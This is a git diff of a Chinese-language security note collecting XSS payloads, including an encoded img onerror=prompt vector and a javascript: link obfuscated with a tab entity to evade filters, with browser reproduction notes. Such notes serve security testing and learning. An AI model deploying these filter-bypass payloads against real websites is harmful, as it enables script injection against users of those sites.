@@ -1,4 +1,4 @@
-## XSS_Payload
+## XSS_另类的Payload
 ### 一、prompt
 ```html
 %3Cp%3E1111111\">< img src=1 onerror=prompt('xss')>%3Cbr%2F%3E%3C%2Fp%3E
@@ -37,8 +37,8 @@ chrome、ms edge可复现</br>
 ```
 测试于safari7.0.6
 
-### 六、
+### 六、对标签属性值进行转码 || 插入控制字符
 ```html
 <a href=javascr&#9ipt:alert(1)>www</a>
 ```
-
+<img src=https://github.com/n4ttt/Sec-Note/blob/main/Image/clipboard.png>
